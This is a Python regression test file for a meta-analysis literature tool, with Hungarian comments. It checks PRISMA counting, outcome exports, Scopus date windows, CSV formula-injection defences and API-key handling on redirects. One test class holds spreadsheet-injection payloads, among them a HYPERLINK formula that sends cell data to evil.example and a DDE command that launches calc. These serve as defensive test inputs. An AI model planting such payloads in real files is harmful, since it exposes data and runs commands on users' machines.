# -*- coding: utf-8 -*-
"""Metaheadhunter — regressziós tesztek a v1 harmadik független átnézésének motor-oldali megállapításaihoz.

Minden teszt OFFLINE, szintetikus adattal (a PMID-ek 99xxxxxx tartományúak, nem valós cikkek).

- F7    own_update: korábban bevont vizsgálat új jelentése (5 éves utánkövetés) NEM új vizsgálat a PRISMA-ban
        („New studies included”, „Total studies” = a két halmaz uniója);
- F8    export --for-analysis: különböző kimenetek ellenőrzött számai nem keveredhetnek egy sorba (pontos
        kimenet-egyezés; kimenet nélkül az elemzési export megtagadva);
- F12   a Scopus frissítő lekérdezése a jóváhagyott ablak VÉGÉT is alkalmazza (és az ablakon kívüli borító-dátumú
        találat kimarad);
- SEC-6 a CSV-exportok (screening, másodlagos adatok, kimenet-sablon, átfedési mátrix) képlet-védelme; a szűrési CSV
        visszatöltése az aposztrófot leveszi;
- SEC-7 a Scopus/OpenAlex kulcs-fejléc átirányításkor nem megy idegen gépre;
- UX-4  a CLI a lépés „needs_human” állapotát lezárja, ha a kapuzó ellenőrzőpont (EP3/EP4) lezárult; a
        forrásválasztás rögzítése a Források lépést is lezárja.
"""
import csv
import http.server
import io
import os
import shutil
import tempfile
import threading
import unittest

from _helpers import ROOT  # noqa: F401  (a sys.path beállítása)
from metaelemzes.headhunter import dedup, eligibility, merge as M, net, openalex, overlap, prisma_map as PM, scopus
from metaelemzes.headhunter import state as S, update as U

import test_headhunter_merge as TM


class _Tmp(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="hh_r3_")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


class OwnUpdateCompanionReportTests(_Tmp):
    """F7."""

    class Pub(TM.FakePubmed):
        def esummary(self, pmids):
            out = super().esummary(pmids)
            for o in out:
                if o["pmid"] == "99200203":
                    o.update(first_author="Brown D", authors=["Brown D", "Other B"], year=2023,
                             title="Five-year outcomes of the large pragmatic trial of drug X in adults with Y")
            return out

    def test_new_report_of_previous_study_is_not_a_new_study(self):
        proj = TM.build_project(self.tmp, mode="own_update")
        TM.accept_all_proposals(proj)
        clients = {"pubmed": self.Pub(["99200203"]), "europepmc": TM.FakeEpmc([]), "ctgov": TM.FakeCtgov()}
        U.run_update(proj, actor="user:SzK", clients=clients, now=TM.NOW, today="2026-10-05")
        dedup.run_dedupe(proj)
        doc = S.read_json(S.path(proj, "studies.json"))
        for p in [p for p in doc["proposals"] if p["status"] == "pending"]:
            if "rec-pmid-99200203" in p["items"]:
                dedup.decide_proposal(proj, p["proposal_id"], "accept", "user:SzK")     # ember: ugyanaz a vizsgálat
        dedup.run_dedupe(proj)
        brown = TM.study_of(proj, "rec-pmid-99100103")
        self.assertEqual(brown, TM.study_of(proj, "rec-pmid-99200203"))
        TM.screen_all(proj, include=["rec-pmid-99200203"], exclude=["rec-nct-nct09999999"])
        res = PM.run_prisma(proj, now=TM.NOW)
        f = res["flow"]
        self.assertEqual(f["included_reports"], 1)
        self.assertEqual(f["included_studies"], 0, "korábban bevont vizsgálat új jelentése nem új vizsgálat")
        self.assertEqual(f["total_studies"], f["previous_studies"])
        self.assertEqual(f["total_reports"], f["previous_reports"] + 1)
        self.assertEqual(f["hh"]["new_reports_of_previous_studies"], 1)
        self.assertIn("rec-pmid-99200203", f["hh"]["new_reports_of_previous_studies_rec_ids"])
        self.assertTrue(f["hh"]["previous_studies_note"]["hu"])
        self.assertTrue(res["ok"], res["findings"])


def _mixed_study():
    return {"study_id": "st-0001", "label": "Smith 2015", "status": "included",
            "reports": [{"rec_id": "rec-pmid-1", "role": "primary", "year": 2015, "ids": {},
                         "eligibility": {"full_text": {"decision": "include"}}}],
            "provenance": [{"review_id": "rv-a"}], "registry_ids": [],
            "secondary_data": [{"review_id": "rv-a", "values": [
                {"field": "e1", "value": 3, "outcome": "cardiovascular mortality", "status": "verified",
                 "evidence_id": "ev-1", "primary_locator": "p.5 T2"},
                {"field": "n1", "value": 50, "outcome": "all-cause mortality", "status": "verified",
                 "evidence_id": "ev-2", "primary_locator": "p.4 T1"},
                {"field": "e2", "value": 9, "outcome": "all-cause mortality", "status": "verified",
                 "evidence_id": "ev-3", "primary_locator": "p.5 T2"},
                {"field": "n2", "value": 51, "outcome": "all-cause mortality", "status": "verified",
                 "evidence_id": "ev-4", "primary_locator": "p.4 T1"}]}]}


class OutcomeRowTests(unittest.TestCase):
    """F8."""

    def test_no_mixing_of_outcomes(self):
        merged = {"studies": [_mixed_study()]}
        _h, rows, _s = M.outcome_rows(merged, outcome="mortality", for_analysis=True)
        row = rows[0]
        self.assertEqual((row["e1"], row["n1"], row["e2"], row["n2"]), ("", "", "", ""))
        self.assertNotEqual(row["adat_forras"], "masodlagos_ellenorzott")
        self.assertIn("all-cause mortality", row["megjegyzes"])
        _h, rows, _s = M.outcome_rows(merged, outcome="all-cause mortality", for_analysis=True)
        row = rows[0]
        self.assertEqual((row["e1"], row["n1"], row["e2"], row["n2"]), ("", "50", "9", "51"))
        self.assertEqual((row["adat_forras"], row["ellenorizve"]), ("masodlagos_ellenorzott", "igen"))
        self.assertIn("cardiovascular mortality", row["megjegyzes"])
        _h, rows, _s = M.outcome_rows(merged, outcome=None, for_analysis=True)
        self.assertEqual([rows[0][k] for k in ("e1", "n1", "e2", "n2")], ["", "", "", ""])

    def test_for_analysis_export_requires_outcome(self):
        tmp = tempfile.mkdtemp(prefix="hh_r3_")
        try:
            proj = TM.build_project(tmp)
            import test_headhunter_review as TR
            TR.ready_for_signoff(proj)
            res = M.signoff(proj, "user:SzK", now=TM.NOW)
            self.assertTrue(res["ok"], res.get("errors"))
            ex = M.run_export(proj, for_analysis=True, now=TM.NOW)
            self.assertEqual(ex["exit_code"], 2)
            self.assertIn("--outcome", ex["errors"][0]["hu"])
            self.assertTrue(M.run_export(proj, outcome="mortality", for_analysis=True, now=TM.NOW)["ok"])
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class ScopusWindowTests(unittest.TestCase):
    """F12."""

    def test_query_has_upper_year_bound(self):
        q = U.build_update_queries([{"concept": "P", "terms": ["adults with Y"]},
                                    {"concept": "I", "terms": ["drug X"]}],
                                   {"start_date": "2020-09-01", "end_date": "2022-12-31"}, ["scopus"])
        self.assertIn("PUBYEAR > 2019 AND PUBYEAR < 2023", q["scopus"][0]["query"])

    def test_cover_date_outside_window_dropped(self):
        class Pager(object):
            def __init__(self, metas):
                self.metas, self.total, self.retrieved, self.complete, self.error = metas, len(metas), len(metas), True, None

            def __iter__(self):
                return iter(self.metas)

        class Client(object):
            def search(self, query, max_results=None, normalize=True):
                return Pager([{"eid": "2-s2.0-1", "title": "In window", "first_author": "Kiss A", "year": 2021,
                               "cover_date": "2021-05-01", "doi": "10.9999/in"},
                              {"eid": "2-s2.0-2", "title": "Too late", "first_author": "Nagy B", "year": 2023,
                               "cover_date": "2023-01-15", "doi": "10.9999/late"},
                              {"eid": "2-s2.0-3", "title": "Too early", "first_author": "Szabo C", "year": 2020,
                               "cover_date": "2020-02-01", "doi": "10.9999/early"}])

        q = U.build_update_queries("x", {"start_date": "2020-09-01", "end_date": "2022-12-31"}, ["scopus"])["scopus"][0]
        recs, info = U._run_query("scopus", Client(), q, 100, "s-scopus-1", TM.NOW)
        self.assertEqual([r["bib"]["title"] for r in recs], ["In window"])
        self.assertEqual(info["out_of_window"], 2)
        self.assertEqual(info["count_retrieved"], 3)


class CsvInjectionTests(unittest.TestCase):
    """SEC-6."""

    EVIL_LABEL = '=HYPERLINK("http://evil.example/x?"&A1,"Smith 2001")'
    EVIL_CIT = "=cmd|' /C calc'!A0"

    def merged(self):
        return {"studies": [{"study_id": "st-0001", "label": self.EVIL_LABEL, "status": "included",
                             "reports": [{"rec_id": "rec-pmid-1", "branch": "other", "role": "primary",
                                          "citation": self.EVIL_CIT, "year": 2001, "ids": {},
                                          "eligibility": {"full_text": {"decision": "include"}}}],
                             "provenance": [{"review_id": "rv-abc"}], "found_by": ["reviews"],
                             "secondary_data": [{"review_id": "rv-abc", "values": [
                                 {"field": "m1", "value": -0.5, "outcome": "@SUM(1)", "status": "verified",
                                  "evidence_id": "ev-1", "primary_locator": "p. 2"}]}]}]}

    def cells(self, text):
        return [c for row in csv.reader(io.StringIO(text), delimiter=";") for c in row]

    def assert_safe(self, text):
        bad = [c for c in self.cells(text) if c[:1] in ("=", "+", "@", "\t", "\r") or
               (c[:1] == "-" and not M._NUMBER_RE.match(c))]
        self.assertEqual(bad, [])

    def test_exports_neutralise_formulas(self):
        merged = self.merged()
        for text in (M._csv_text(*M.screening_rows(merged)), M._csv_text(*M.secondary_rows(merged)),
                     M._csv_text(*M.outcome_rows(merged, outcome="@SUM(1)", for_analysis=True)[:2])):
            self.assert_safe(text)
        out = M._csv_text(*M.outcome_rows(merged, outcome="@SUM(1)", for_analysis=True)[:2])
        row = list(csv.DictReader(io.StringIO(out), delimiter=";"))[0]
        self.assertEqual(row["m1"], "-0.5", "a negatív szám szám marad")
        self.assertEqual(row["study"], "'" + self.EVIL_LABEL)
        doc = {"reviews": ["rv-abc"], "rows": [{"key": "st-0001", "label": self.EVIL_LABEL, "in": [True],
                                                "index_review": None}], "N": 1, "r": 1, "c": 1, "cca_pct": None,
               "band": None}
        self.assert_safe(overlap.matrix_csv(doc, [{"review_id": "rv-abc", "bib": {"first_author": "=EVIL",
                                                                                 "year": 2020}}]))

    def test_screening_import_strips_apostrophe(self):
        self.assertEqual(eligibility._unsafe("'=x"), "=x")
        self.assertEqual(eligibility._unsafe("'abc"), "'abc")
        self.assertEqual(M.excel_unsafe(M.excel_safe(self.EVIL_CIT)), self.EVIL_CIT)


class RedirectSecretTests(unittest.TestCase):
    """SEC-7."""

    def test_keys_not_forwarded_to_other_host(self):
        got = []

        class B(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                got.append(dict(self.headers.items()))
                body = b'{"search-results": {"opensearch:totalResults": "0", "entry": []}, "results": [], "meta": {}}'
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        sb = http.server.HTTPServer(("127.0.0.1", 0), B)
        threading.Thread(target=sb.serve_forever, daemon=True).start()
        other = "http://localhost:%d/collect" % sb.server_port           # más gépnév (localhost ≠ 127.0.0.1)

        class A(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(302)
                self.send_header("Location", other)
                self.send_header("Content-Length", "0")
                self.end_headers()

            def log_message(self, *a):
                pass

        sa = http.server.HTTPServer(("127.0.0.1", 0), A)
        threading.Thread(target=sa.serve_forever, daemon=True).start()
        env = {"MA_SCOPUS_APIKEY": "SCOPUS-SECRET-1234", "MA_SCOPUS_INSTTOKEN": "INST-SECRET-5678",
               "MA_OPENALEX_APIKEY": "OA-SECRET-9999", "no_proxy": "*"}
        saved = (scopus.BASE, scopus.SEARCH_URL, openalex.BASE)
        try:
            http_c = net.HttpClient(env=env, use_env_cassette=False, max_retries=0)
            scopus.BASE = "http://127.0.0.1:%d/content/" % sa.server_port
            scopus.SEARCH_URL = scopus.BASE + "search/scopus"
            try:
                scopus.Client(http=http_c, env=env).abstract("2-s2.0-85000000000", id_type="eid")
            except Exception:                                   # noqa: BLE001 — csak a fejlécek számítanak
                pass
            openalex.BASE = "http://127.0.0.1:%d/" % sa.server_port
            try:
                openalex.Client(http=http_c, env=env).work("W123")
            except Exception:                                   # noqa: BLE001
                pass
        finally:
            scopus.BASE, scopus.SEARCH_URL, openalex.BASE = saved
            sa.shutdown()
            sb.shutdown()
            sa.server_close()
            sb.server_close()
        self.assertTrue(got, "az átirányítás célja kapott kérést")
        for hdrs in got:
            low = {k.lower(): v for k, v in hdrs.items()}
            for k in ("x-els-apikey", "x-els-insttoken", "authorization"):
                self.assertNotIn(k, low)
            self.assertNotIn("SECRET", " ".join(hdrs.values()))

    def test_same_origin_redirect_keeps_key(self):
        import urllib.request
        h = net._SameOriginSecretRedirect()
        req = urllib.request.Request("https://api.elsevier.com/content/abstract/eid/1")
        req.add_unredirected_header("X-ELS-APIKey", "k")
        new = h.redirect_request(req, None, 302, "Found", {}, "https://api.elsevier.com/content/abstract/eid/2")
        self.assertEqual(new.get_header("X-els-apikey"), "k")
        new = h.redirect_request(req, None, 302, "Found", {}, "http://api.elsevier.com/content/abstract/eid/2")
        self.assertIsNone(new.get_header("X-els-apikey"), "https→http: a kulcs nem megy")


class GatedStepClosureTests(_Tmp):
    """UX-4: nincs „döntésre vár”, amikor nincs mit eldönteni."""

    def _open(self, proj):
        oi = eligibility.open_items(S.read_json(S.path(proj, "studies.json")), S.read_decisions(proj),
                                    S.load_state(proj))
        return sorted(set(oi["title_abstract"]) | set(oi["full_text"]) | set(oi["conflicts"]))

    def test_screen_and_update_close_when_checkpoints_close(self):
        proj = TM.build_project(self.tmp)
        TM.accept_all_proposals(proj)
        U.run_update(proj, actor="user:SzK", clients=TM.fake_clients(), now=TM.NOW, today="2026-10-05")
        TM.accept_all_proposals(proj)
        self.assertEqual("needs_human", S.load_state(proj)["steps"]["update_search"]["status"])
        recs = self._open(proj)
        self.assertGreater(len(recs), 1)
        TM.screen_all(proj, include=recs[:1])
        st = S.load_state(proj)
        self.assertEqual("needs_human", st["steps"]["screen"]["status"], "még van nyitott szűrési tétel")
        self.assertEqual("needs_human", st["steps"]["update_search"]["status"])
        TM.screen_all(proj, include=recs[1:])
        self.assertEqual([], self._open(proj))
        st = S.load_state(proj)
        self.assertEqual("done", st["steps"]["screen"]["status"])
        self.assertEqual("done", st["steps"]["update_search"]["status"])
        M.run_merge(proj, now=TM.NOW)
        st = S.load_state(proj)
        ep = dict((c["id"], c) for c in st["checkpoints"])
        self.assertEqual((ep["EP4"]["status"], ep["EP4"]["open_items"]), ("done", 0))
        self.assertEqual("done", st["steps"]["screen"]["status"])
        self.assertEqual("done", st["steps"]["update_search"]["status"])

    def test_merge_closes_stale_needs_human(self):
        proj = TM.build_project(self.tmp)
        TM.accept_all_proposals(proj)
        recs = self._open(proj)
        TM.screen_all(proj, include=recs)

        def upd(st):                                     # régi (javítás előtti) állapot: a CLI nem zárta le
            for step in ("screen", "update_search", "dedupe", "extract"):
                st["steps"][step] = dict(st["steps"].get(step) or {}, status="needs_human")
        S.mutate_state(proj, upd)
        M.run_merge(proj, now=TM.NOW)
        st = S.load_state(proj)
        for step in ("screen", "update_search", "dedupe"):
            self.assertEqual("done", st["steps"][step]["status"], step)
        self.assertEqual("needs_human", st["steps"]["extract"]["status"], "EP2 még nyitott (Kim 2017 javasolt)")

    def test_close_gated_steps_needs_known_zero(self):
        st = {"steps": {"screen": {"status": "needs_human"}, "update_search": {"status": "needs_human"}}}
        self.assertEqual([], S.close_gated_steps(st, {"EP4": None}))
        self.assertEqual(["screen"], S.close_gated_steps(st, {"EP3": 2, "EP4": 0}))
        self.assertEqual("needs_human", st["steps"]["update_search"]["status"])

    def test_source_selection_closes_sources_step(self):
        proj = TM.build_project(self.tmp)
        self.assertNotEqual("done", (S.load_state(proj)["steps"].get("sources") or {}).get("status"))
        out = io.StringIO()
        rc = TM.cli_main(["sources", proj, "--disable", "openalex", "--actor", "user:SzK", "--json"], stdout=out)
        self.assertEqual(0, rc, out.getvalue())
        self.assertEqual("done", S.load_state(proj)["steps"]["sources"]["status"])


if __name__ == "__main__":
    unittest.main()
